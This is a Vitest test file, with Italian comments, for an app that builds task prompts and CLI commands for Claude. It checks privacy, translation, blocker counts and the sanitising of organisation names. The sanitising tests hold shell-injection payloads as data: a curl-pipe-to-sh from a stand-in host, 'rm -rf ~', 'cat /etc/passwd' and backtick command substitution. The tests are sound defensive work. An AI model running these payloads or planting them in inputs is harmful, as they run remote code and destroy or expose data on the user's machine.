/**
 * Cosa finisce — e cosa NON finisce — nel testo che si consegna a Claude.
 *
 * Il controllo che conta e' il secondo. Questo testo nasce per essere
 * incollato altrove, magari in un Claude che non e' quello aziendale: se ci
 * entrassero i commenti, uscirebbero nomi di colleghi e discussioni interne
 * per un gesto che l'utente legge come "copia il task".
 */

import { describe, expect, it } from 'vitest';
import {
  comandiInstallazione,
  comandoCli,
  frasePerMcp,
  promptPerTask,
} from '@/lib/promptClaude';
import type { Traduttore } from '@/lib/promptClaude';
import type { Task } from '@/lib/types';

const task: Task = {
  id: '3f2a9c10-0000-4000-8000-000000000000',
  title: 'Rivedere il contratto fornitore',
  description: 'Controllare le penali e la durata.',
  assigneeId: 'emp-1',
  priority: 'high',
  status: 'not-started',
  dueDate: '2026-10-01T00:00:00.000Z',
  createdAt: '2026-09-01T00:00:00.000Z',
  department: 'Legale',
  labels: ['contratti'],
  subtasks: [
    { id: 's1', title: 'Leggere le penali', done: true, createdAt: '2026-09-01' },
    { id: 's2', title: 'Confrontare con il precedente', done: false, createdAt: '2026-09-01' },
  ],
  comments: [
    {
      id: 'c1',
      taskId: '3f2a9c10-0000-4000-8000-000000000000',
      userId: 'emp-2',
      userName: 'Lucia Bianchi',
      userAvatar: '',
      content: 'Il fornitore ha gia\' sforato due volte, non fidarti.',
      createdAt: '2026-09-02',
    },
  ],
};

describe('promptPerTask', () => {
  it('porta il lavoro da fare', () => {
    const p = promptPerTask(task, { organizzazione: 'Acme' });
    expect(p).toContain('Rivedere il contratto fornitore');
    expect(p).toContain('Controllare le penali e la durata.');
    expect(p).toContain('Acme');
    expect(p).toContain('Legale');
    expect(p).toContain('2026-10-01');
  });

  it('segna i passi fatti e quelli da fare', () => {
    const p = promptPerTask(task);
    expect(p).toContain('- [x] Leggere le penali');
    expect(p).toContain('- [ ] Confrontare con il precedente');
  });

  it('NON porta i commenti, ne il nome di chi li ha scritti', () => {
    const p = promptPerTask(task);
    expect(p).not.toContain('Lucia Bianchi');
    expect(p).not.toContain('non fidarti');
    expect(p).not.toContain('sforato');
  });

  it('avverte quando l attivita e bloccata, perche fuori di qui non si vede', () => {
    const bloccata: Task = { ...task, blockedBy: ['a', 'b'] };
    // L'elenco serve: senza, non si puo' sapere quali di quei legami siano
    // ancora blocchi veri. Vedi il gruppo "i bloccanti, e quali contano".
    const aperti: Task[] = [
      { ...task, id: 'a', status: 'in-progress' },
      { ...task, id: 'b', status: 'not-started' },
    ];
    const p = promptPerTask(bloccata, { tuttiITask: [bloccata, ...aperti] });
    expect(p).toContain('2 other tasks');
    expect(p).toMatch(/refuses/);
  });

  it('regge un attivita senza descrizione, passi o scadenza', () => {
    const scarna: Task = {
      ...task,
      description: '',
      subtasks: [],
      dueDate: null,
      labels: [],
      department: null,
    };
    const p = promptPerTask(scarna);
    expect(p).toContain('(no description)');
    expect(p).not.toContain('Due Date:');
    expect(p).not.toContain('Labels:');
  });
});

describe('scorciatoie', () => {
  it('senza argomenti chiude l attivita, perche e quel gesto che si dimentica', () => {
    /*
      Il valore predefinito era 'in-corso' mentre il commento sopra la funzione
      e l'etichetta nell'interfaccia — "e quando hai finito, dal terminale" —
      promettevano il comando di chiusura. Chi lo copiava si ritrovava il task
      ancora aperto. Segnalato da Codex sulla PR #19.
    */
    expect(comandoCli(task)).toMatch(/ completata$/);
    expect(comandoCli(task)).not.toContain('in-corso');
  });

  it('il comando usa l identificativo breve, quello che l elenco mostra', () => {
    expect(comandoCli(task)).toContain('3f2a9c10');
    expect(comandoCli(task)).not.toContain(task.id);
    expect(comandoCli(task, 'completata')).toContain('completata');
  });

  it('la frase per MCP nomina il task, non incolla il contenuto', () => {
    const f = frasePerMcp(task);
    expect(f).toContain('3f2a9c10');
    expect(f).not.toContain('Controllare le penali');
  });
});

describe('la lingua del testo', () => {
  /*
    Il difetto e' esistito: l'interfaccia era tradotta, il testo prodotto no.
    Chi usava l'applicazione in inglese premeva "Work on this with Claude" e si
    trovava nella casella un testo che cominciava con "Aiutami a portare avanti
    questa attivita'". Se ne e' accorta una fotografia fatta per il README.
  */
  const finto: Traduttore = (chiave, parametri) =>
    `[${chiave.slice(0, 12)}${parametri ? ' ' + JSON.stringify(parametri) : ''}]`;

  it('usa il traduttore che riceve, per ogni pezzo di prosa', () => {
    const p = promptPerTask(task, { organizzazione: 'Acme', t: finto });

    // L'impalcatura passa dal traduttore...
    expect(p).toContain('[Help me move');
    expect(p).toContain('[When we are');

    // ...mentre il contenuto dell'attivita' resta cio' che e', perche' e' dato
    // dell'utente e tradurlo sarebbe falsificarlo.
    expect(p).toContain('Rivedere il contratto fornitore');
    expect(p).toContain('Acme');
  });

  it('passa il numero dei bloccanti al traduttore, non lo incolla nel testo', () => {
    const bloccata = { ...task, blockedBy: ['a', 'b', 'c'] };
    const aperti = ['a', 'b', 'c'].map((id) => ({ ...task, id, status: 'in-progress' as const }));
    expect(
      promptPerTask(bloccata, { t: finto, tuttiITask: [bloccata, ...aperti] })
    ).toContain('{"quante":3}');
  });

  it('la frase per MCP e tradotta e porta l identificativo', () => {
    expect(frasePerMcp(task, finto)).toBe('[Open TaskFlo {"id":"3f2a9c10"}]');
  });

  it('senza traduttore resta in inglese, con i segnaposto sostituiti', () => {
    expect(frasePerMcp(task)).toBe('Open TaskFlow task 3f2a9c10 and help me work on it.');
  });
});

describe('i bloccanti, e quali contano', () => {
  const bloccata = { ...task, blockedBy: ['b1', 'b2'] };
  const chiuso = (id: string, extra: Partial<Task> = {}): Task => ({
    ...task,
    id,
    status: 'completed',
    requiresApproval: false,
    ...extra,
  });

  it('non dice niente se i bloccanti sono tutti gia chiusi', () => {
    /*
      `blockedBy` elenca i LEGAMI, non i blocchi: un bloccante completato e
      vistato resta li' come traccia storica. Contandoli tutti si avvisava
      Claude che il database avrebbe rifiutato la chiusura anche quando non
      c'era piu' niente a bloccare.
    */
    const p = promptPerTask(bloccata, {
      tuttiITask: [bloccata, chiuso('b1'), chiuso('b2')],
    });
    expect(p).not.toMatch(/waiting for/);
  });

  it('conta solo quelli aperti, non tutti i legami', () => {
    const p = promptPerTask(bloccata, {
      tuttiITask: [bloccata, chiuso('b1'), { ...task, id: 'b2', status: 'in-progress' }],
    });
    expect(p).toContain('1 other tasks');
  });

  it('un completato che aspetta il visto blocca ancora, come il trigger', () => {
    const p = promptPerTask(bloccata, {
      tuttiITask: [
        bloccata,
        chiuso('b1'),
        chiuso('b2', { requiresApproval: true, approvedBy: undefined }),
      ],
    });
    expect(p).toContain('1 other tasks');
  });

  it('senza l elenco tace, invece di dire una cosa che potrebbe essere falsa', () => {
    expect(promptPerTask(bloccata)).not.toMatch(/waiting for/);
  });
});

describe('priorita e stato', () => {
  it('passano dal traduttore come chiavi, non come valori grezzi della colonna', () => {
    /*
      Il testo restava mezzo tradotto: le intestazioni nella lingua giusta e i
      valori con dentro `high` e `not-started`, cioe' cio' che c'e' scritto
      nella colonna. Sono valori di una scala chiusa, decisi
      dall'applicazione: `ETICHETTA_PRIORITA` e `ETICHETTA_STATO` esistono
      proprio per questo.
    */
    const finto: Traduttore = (chiave) => `<${chiave}>`;
    const p = promptPerTask({ ...task, priority: 'high', status: 'not-started' }, { t: finto });

    expect(p).toContain('<High>');
    expect(p).toContain('<Not Started>');
    expect(p).not.toMatch(/: high/);
    expect(p).not.toMatch(/not-started/);
  });

  it('un valore fuori scala si mostra com e scritto, invece di sparire', () => {
    // I dati arrivano anche da importazioni: una priorita' sconosciuta deve
    // restare leggibile.
    const p = promptPerTask({ ...task, priority: 'urgentissima' as Task['priority'] });
    expect(p).toContain('urgentissima');
  });
});

describe('l organizzazione nel comando', () => {
  const ID = 'd35392e2-0c26-4333-8344-a40fc781f020';

  it('la indica con --org e l identificativo', () => {
    expect(comandoCli(task, 'completata', ID)).toBe(
      `node scripts/taskflow.mjs stato 3f2a9c10 completata --org ${ID}`
    );
  });

  it('non la indica quando non serve, per non allungare il comando a tutti', () => {
    expect(comandoCli(task, 'completata', null)).not.toContain('--org');
    expect(comandoCli(task)).not.toContain('--org');
  });

  /*
    Il controllo che conta davvero.

    Il nome di un'organizzazione lo decide chi l'amministra, e questa finestra
    dice "copia ed esegui". La prima versione incollava quel nome dentro il
    comando come `TASKFLOW_ORG="..."`: un nome come `$(curl ... | sh)`, o uno
    che chiude le virgolette e ne apre un altro comando, veniva eseguito sul
    computer di chi incollava. Fra il nome scelto da un altro e l'esecuzione di
    codice sulla macchina di un collega c'era un clic.

    Ora passa solo cio' che ha la forma di un UUID, che non contiene niente che
    una shell interpreti. Tutto il resto non viene scritto affatto: meglio un
    comando che chiede di indicare l'organizzazione a mano di uno che esegue
    quello che capita.
  */
  it('non scrive niente che una shell possa interpretare', () => {
    const veleni = [
      '$(curl http://esempio.test/x.sh | sh)',
      '"; rm -rf ~; echo "',
      '`whoami`',
      'Acme & shutdown now',
      "Acme'; cat /etc/passwd; echo '",
      'Acme $HOME',
      'Studio Ponte e Figli',
      '',
    ];
    for (const nome of veleni) {
      const comando = comandoCli(task, 'completata', nome);
      expect(comando, nome).toBe('node scripts/taskflow.mjs stato 3f2a9c10 completata');
    }
  });

  it('accetta un UUID anche in maiuscolo, che resta un UUID', () => {
    expect(comandoCli(task, 'completata', ID.toUpperCase())).toContain(
      `--org ${ID.toUpperCase()}`
    );
  });
});

describe('i comandi di installazione', () => {
  const ID = 'd35392e2-0c26-4333-8344-a40fc781f020';

  it('portano l organizzazione, altrimenti il connettore si ferma a ogni chiamata', () => {
    /*
      Claude Desktop non eredita l'ambiente del terminale: se l'organizzazione
      non finisce nella configurazione DURANTE l'installazione, ogni chiamata
      successiva si ferma — e la persona lo scopre da dentro Claude, non dal
      terminale dove aveva appena letto "Aggiunto".
    */
    expect(comandiInstallazione(ID)).toContain(`--installa --org ${ID}`);
  });

  it('restano due righe pulite quando non serve', () => {
    expect(comandiInstallazione(null)).toBe(
      'node scripts/taskflow.mjs accedi\nnode scripts/mcp/taskflow.mjs --installa'
    );
  });

  it('non scrivono niente che una shell possa interpretare', () => {
    expect(comandiInstallazione('$(rm -rf ~)')).not.toContain('--org');
    expect(comandiInstallazione('Acme')).not.toContain('--org');
  });
});
